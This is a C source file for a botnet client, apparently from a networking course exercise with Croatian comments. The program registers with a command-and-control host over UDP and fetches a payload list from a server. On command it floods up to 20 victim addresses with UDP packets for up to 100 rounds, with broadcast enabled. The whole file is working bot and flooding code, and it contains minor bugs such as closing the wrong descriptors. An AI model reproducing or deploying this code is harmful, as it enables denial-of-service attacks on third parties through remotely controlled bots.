#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <err.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>
#include <assert.h>

#include "pomocni.h"
#include "wrappers.h"

#define SERVER_RESPONSE_MAXLEN 1024
#define MAXLENCC (1 + (INET_ADDRSTRLEN + 22) * 20)
#define BOTPORT "5555"
#define MAX_VICTIM_COUNT 20

int ccSock;
int serverSock;
int victimSockets[MAX_VICTIM_COUNT];

void closeSock_and_quit()
{
	close(ccSock);
	close(serverSock);
	for (int i = 0; i < MAX_VICTIM_COUNT; i++)
	{
		close(i); // close victim socks
	}
	exit(0);
}

void sig_alrm(int sig)
{
	debug_printf("vrijeme isteklo %d\n", sig);
	return;
}

void usage();

void udp_prog(char *buff, int ccSock, struct sockaddr_in *ccsa);

void tcp_prog(char *buff, int ccSock, struct sockaddr_in *ccsa);

void reg_and_wait(char *, char *);

void rdyForAttack(int ccSock, char *payloadList, struct sockaddr_in *);

void attackAll(char *buff, char *payload, int msglen, int ccSock);

void attackVictim(int sockfd, char *payload, char *victim_ip, char *victim_port);

int main(int argc, char *argv[])
{
	if (argc != 3)
	{
		usage();
	}

	char *ccip_addres = argv[1];
	char *ccport = argv[2];

	debug_printf("ccip_addres = %s\nccport = %s\n", ccip_addres, ccport);

	reg_and_wait(ccip_addres, ccport);

	return 0;
}

void usage()
{
	fprintf(stderr, "%s\n", "Usage:  ./bot server_ip server_port");
	exit(1);
}

void reg_and_wait(char *ccip_addres, char *ccport)
{
	debug_printf(" ----- registering\n");

	// addresa od cc
	struct sockaddr_in ccsa;
	createSockaddr_inFromStrings(&ccsa, ccip_addres, ccport);

	// napravi socket za cc
	struct addrinfo hints, *res;
	memset(&hints, 0, sizeof hints);

	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_DGRAM;
	hints.ai_flags = AI_PASSIVE;

	int error = getaddrinfo(NULL, "0", &hints, &res);
	if (error)
		errx(1, "%s", gai_strerror(error));

	debug_printf("getaddrinfo finished\n");
	dbgPrintAddrinfo(res);

	ccSock = Socket(res->ai_family,
					res->ai_socktype,
					res->ai_protocol);

	freeaddrinfo(res);
	// nikad nemoj freeaddringo &hints
	//freeaddrinfo(&hints);
	debug_printf("freed addrinfo\n");

	// posalji REG
	char *regStr = "REG\n";
	Sendto(ccSock, regStr, strlen(regStr), 0, (struct sockaddr *)&ccsa, sizeof(ccsa));

	debug_printf("sent: %s\n", regStr);

	char buff[MAXLENCC];
	int msglen;
	socklen_t addrlen;
	while (1)
	{
		debug_printf("%s cekaj komande od cc...\n", "  ---  ");

		addrlen = sizeof(ccsa);
		msglen = Recvfrom(ccSock, buff, MAXLENCC, 0, (struct sockaddr *)&ccsa, &addrlen);
		buff[msglen] = 0;

		debug_printf("Recieved from CC: %s\n", buff);

		char command = buff[0];
		debug_printf("command je: %c\n", command);

		if (command == '0')
		{
			debug_printf("ok, bye\n");
			closeSock_and_quit();
		}
		else if (command == '1')
		{
			// tcp prog
			tcp_prog(buff, ccSock, &ccsa);
		}
		else if (command == '2')
		{
			// udp prog
			udp_prog(buff, ccSock, &ccsa);
		}
		else
		{
			debug_printf("not accepting command: %c\n", command);
			continue;
		}
	}
}

void tcp_prog(char *buff, int ccSock, struct sockaddr_in *ccsa)
{
	debug_printf("%s tcp_prog()...\n", "   ---   ");

	char server_ip[INET_ADDRSTRLEN];
	strncpy(server_ip, buff + 1, INET_ADDRSTRLEN);

	debug_printf("server_ip je %s\n", server_ip);

	char server_port[22];
	strncpy(server_port, buff + INET_ADDRSTRLEN + 1, 5);
	debug_printf("server_port je %s\n", server_port);

	struct sockaddr_in server_sa;
	createSockaddr_inFromStrings(&server_sa, server_ip, server_port);

	// napravi socket za server
	struct addrinfo hints, *res;
	memset(&hints, 0, sizeof hints);

	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE;

	int error = getaddrinfo(NULL, "0", &hints, &res);
	if (error)
		errx(1, "%s", gai_strerror(error));

	debug_printf("getaddrinfo finished\n");
	dbgPrintAddrinfo(res);

	serverSock = Socket(res->ai_family,
						res->ai_socktype,
						res->ai_protocol);

	freeaddrinfo(res);
	// nikad nemoj freeaddringo &hints
	//freeaddrinfo(&hints);
	debug_printf("freed addrinfo\n");

	// connect
	Connect(serverSock, (struct sockaddr *)&server_sa, sizeof(server_sa));

	debug_printf("connected\n");
	debug_printf("sending HELLO\n");

	writen(serverSock, "HELLO\n", strlen("HELLO\n"));

	debug_printf("sent\n");
	debug_printf("waiting for server response\n");

	char server_buff[SERVER_RESPONSE_MAXLEN];
	char c;
	int i = 0;
	int readed;

	while (1)
	{
		readed = 0;
		
		readed = readn(serverSock, &c, 1);
		
		if (readed == 0)
		{
			break;
		}
		server_buff[i] = c;
		i++;
	}
	server_buff[i] = '\0';

	debug_printf("recieved from server: %s\n", server_buff);

	close(serverSock);
	debug_printf("hangup on server\n");

	rdyForAttack(ccSock, server_buff, ccsa);
}

void udp_prog(char *buff, int ccSock, struct sockaddr_in *ccsa)
{
	debug_printf("%s udp_prog()...\n", "   ---   ");

	char server_ip[INET_ADDRSTRLEN];
	strncpy(server_ip, buff + 1, INET_ADDRSTRLEN);

	debug_printf("server_ip je %s\n", server_ip);

	char server_port[22];
	strncpy(server_port, buff + INET_ADDRSTRLEN + 1, 5);
	debug_printf("server_port je %s\n", server_port);

	struct sockaddr_in server_sa;
	createSockaddr_inFromStrings(&server_sa, server_ip, server_port);

	// napravi socket za server
	struct addrinfo hints, *res;
	memset(&hints, 0, sizeof hints);

	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_DGRAM;
	hints.ai_flags = AI_PASSIVE;

	int error = getaddrinfo(NULL, "0", &hints, &res);
	if (error)
		errx(1, "%s", gai_strerror(error));

	debug_printf("getaddrinfo finished\n");
	dbgPrintAddrinfo(res);

	serverSock = Socket(res->ai_family,
						res->ai_socktype,
						res->ai_protocol);

	freeaddrinfo(res);
	// nikad nemoj freeaddringo &hints
	//freeaddrinfo(&hints);
	debug_printf("freed addrinfo\n");

	debug_printf("sending HELLO\n");
	Sendto(serverSock, "HELLO\n", strlen("HELLO\n"), 0, (struct sockaddr *)&server_sa, sizeof(server_sa));

	struct sockaddr_in sender;
	socklen_t addrlen;
	char server_buff[SERVER_RESPONSE_MAXLEN];

	while (1)
	{
		int serMesLen = Recvfrom(serverSock, server_buff, SERVER_RESPONSE_MAXLEN, 0, (struct sockaddr *)&sender, &addrlen);
		server_buff[serMesLen] = 0;

		debug_printf("Recieved something: %s\n", server_buff);

		if (compareAddy(&sender, &server_sa) == 0)
		{
			break;
		}
		else
		{
			continue;
		}
	}

	debug_printf("sender was server\n");

	rdyForAttack(ccSock, server_buff, ccsa);
}

void rdyForAttack(int ccSock, char *payloadList, struct sockaddr_in *ccsa)
{
	char buff[MAXLENCC];
	int msglen;
	socklen_t addrlen;

	while (1)
	{
		debug_printf("%s spreman za napad, cekaj komande od cc...\n", "   ---   ");

		addrlen = sizeof(*ccsa);
		msglen = Recvfrom(ccSock, buff, MAXLENCC, 0, (struct sockaddr *)ccsa, &addrlen);
		buff[msglen] = 0;

		debug_printf("Recieved something from CC: %s\n", buff);
		debug_printf("msglen je %d\n", msglen);

		char command = buff[0];
		debug_printf("command je: %c\n", command);

		if (command == '0')
		{
			debug_printf("ok, bye\n");
			closeSock_and_quit();
		}
		else if (command == '3')
		{
			// run
			attackAll(buff, payloadList, msglen, ccSock);
		}
		else if (command == '2')
		{
			// udp prog
			udp_prog(buff, ccSock, ccsa);
		}
		else if (command == '1')
		{
			// tcp prog
			tcp_prog(buff, ccSock, ccsa);
		}
		else
		{
			debug_printf("not accepting command: %s\n", command);
		}
	}
}

void attackAll(char *buff, char *payloadList, int msglen, int ccSock)
{
	debug_printf("%s attacking all...\n", "   ---   ");

	int pairSize = (INET_ADDRSTRLEN + 22);

	int num_of_vict_pairs = (msglen - 1) / pairSize;
	debug_printf("num_of_vict_pairs = %d\n", num_of_vict_pairs);

	assert(num_of_vict_pairs <= MAX_VICTIM_COUNT);

	fd_set read_fds, master;
	FD_ZERO(&read_fds);
	FD_ZERO(&master);
	int fdmax = ccSock;
	FD_SET(ccSock, &master);

	for (int i = 0; i < num_of_vict_pairs; i++)
	{
		// napravi socket za svaku zrtvu
		struct addrinfo hints, *res;
		memset(&hints, 0, sizeof hints);

		hints.ai_family = AF_INET;
		hints.ai_socktype = SOCK_DGRAM;
		hints.ai_flags = 0;

		int error = getaddrinfo(NULL, "0", &hints, &res);
		if (error)
			errx(1, "%s", gai_strerror(error));

		victimSockets[i] = Socket(res->ai_family,
								  res->ai_socktype,
								  res->ai_protocol);
		
		const int on = 1;
		Setsockopt(victimSockets[i], SOL_SOCKET, SO_BROADCAST, &on, sizeof(on));
		
		FD_SET(victimSockets[i], &master);
		if (victimSockets[i] > fdmax)
			fdmax = victimSockets[i];

		debug_printf("victim socket %d created\n", i);

		freeaddrinfo(res);
		// nikad nemoj freeaddringo &hints
		//freeaddrinfo(&hints);
	}

	struct timeval timeMax = {1, 0}; // 1 sekunda

	for (int i = 0; i < 100; i++)
	{
		debug_printf("%s attack numer %d, waiting 1 sec\n","   ---   ", i + 1);
		int breakFlag = 0;
		
		// vidi je li cc ili neka zrtva poslala nesto s vremenskim istekom od 1 sec
		read_fds = master;
		Select(fdmax + 1, &read_fds, NULL, NULL, &timeMax);

		for (int j = 0; j <= fdmax; j++)
		{
			if (FD_ISSET(j, &read_fds))
			{
				// netko je napisao nesto
				if (j == ccSock)
				{
					debug_printf("cc je nesto poslao\n");

					struct sockaddr sender;
					socklen_t addrlen;
					char buff[MAXLENCC];

					Recvfrom(ccSock, buff, sizeof(buff), 0, &sender, &addrlen);

					debug_printf("recieved from cc: %s\n", buff);

					char command = buff[0];
					debug_printf("command je: %c\n", command);

					if (command == '4')
					{
						// stop
						debug_printf("ok, I'm stopping\n");
						breakFlag = 1;
					}
					
					else if (command == '0')
					{
						debug_printf("ok, bye\n");
						closeSock_and_quit();
					}
					
					else
					{
						debug_printf("not accepting command: %s\n", command);
						continue;
					}
				}
				else
				{
					// neka zrtva je odgovorila
					debug_printf("one of the victims responded, stoping attack\n");
					breakFlag = 1;
				}
			}
		}
		if (breakFlag)
			break; // stoping attacks

		for (int k = 0; k < num_of_vict_pairs; k++)
		{
			int portStrSize = 22;
			char * offset = buff + 1 + (pairSize * k) + INET_ADDRSTRLEN;
			char victim_port[portStrSize];
			//strncpy(victim_port, offset, portStrSize);
			strcpy(victim_port, offset);
			debug_printf("victim_port = %s\n", victim_port);

			char victim_ip[INET_ADDRSTRLEN];
			//strncpy(victim_ip, buff + 1 + (pairSize * k), INET_ADDRSTRLEN);
			strcpy(victim_ip, buff + 1 + (pairSize * k));
			debug_printf("victim_ip = %s\n", victim_ip);

			attackVictim(victimSockets[k], payloadList, victim_ip, victim_port);
			
			//free(victim_port);
		}
	}
}

void attackVictim(int sockfd, char *payloadList, char *victim_ip, char *victim_port)
{
	debug_printf("   attacking victim at %s:%s\n", victim_ip, victim_port);

	// napravi sockaddr za zrtvu
	struct sockaddr_in vsa;
	createSockaddr_inFromStrings(&vsa, victim_ip, victim_port);

	char *token, *str, *toFree;

	toFree = str = strdup(payloadList);
	while ((token = strsep(&str, ":")))
	{
		if (strcmp(token, "PAYLOAD") != 0){
			debug_printf("sending payload %s\n", token);
			Sendto(sockfd, token, strlen(token), 0, (struct sockaddr *)&vsa, sizeof(vsa));
		}
	}
	free(toFree);
}
